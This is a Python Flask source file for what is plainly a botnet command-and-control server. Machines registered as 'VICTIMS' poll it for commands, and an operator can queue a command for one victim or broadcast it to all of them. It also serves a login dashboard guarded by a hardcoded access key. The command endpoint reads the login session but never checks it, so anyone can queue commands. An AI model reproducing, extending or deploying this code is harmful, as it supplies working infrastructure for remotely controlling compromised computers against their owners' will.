from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import os
import json
import time

app = Flask(__name__)
app.secret_key = os.urandom(24) # Secure random key for sessions

# DATA STORAGE (In-Memory)
VICTIMS = {}
COMMAND_QUEUE = {}

# CONFIG
ADMIN_KEY = "Slay7676guyufezfze"

# --- WEB INTERFACE ROUTES ---

@app.route('/')
def index():
    if session.get('logged_in'):
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['password'] == ADMIN_KEY:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            error = 'Invalid Access Key'
    return render_template('login.html', error=error)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# --- API ROUTES ---

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    uid = str(data.get('userid'))
    username = data.get('username')
    
    VICTIMS[uid] = {
        "name": username,
        "last_seen": time.time()
    }
    return jsonify({"status": "success", "msg": "Registered"})

@app.route('/poll/<userid>', methods=['GET'])
def poll(userid):
    uid = str(userid)
    if uid in VICTIMS:
        VICTIMS[uid]['last_seen'] = time.time()
    
    cmd = COMMAND_QUEUE.get(uid)
    if cmd:
        del COMMAND_QUEUE[uid]
        return jsonify({"command": cmd})
    return jsonify({"command": "NO_CMD"})

@app.route('/command', methods=['POST'])
def send_command():
    # Web Dashboard check (if cookie present)
    is_web_user = session.get('logged_in')
    
    data = request.json
    target_id = str(data.get('target'))
    cmd = data.get('command')
    
    if target_id == "ALL":
        count = 0
        for uid in VICTIMS:
            COMMAND_QUEUE[uid] = cmd
            count += 1
        return jsonify({"status": "broadcast_queued", "count": count, "cmd": cmd})
    else:
        COMMAND_QUEUE[target_id] = cmd
        return jsonify({"status": "queued", "target": target_id, "cmd": cmd})

@app.route('/victims', methods=['GET'])
def get_victims():
    cleanup_victims()
    return jsonify(VICTIMS)

def cleanup_victims():
    # Remove victims inactive for > 30 seconds
    now = time.time()
    to_remove = [uid for uid, data in VICTIMS.items() if now - data['last_seen'] > 30]
    for uid in to_remove:
        del VICTIMS[uid]

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
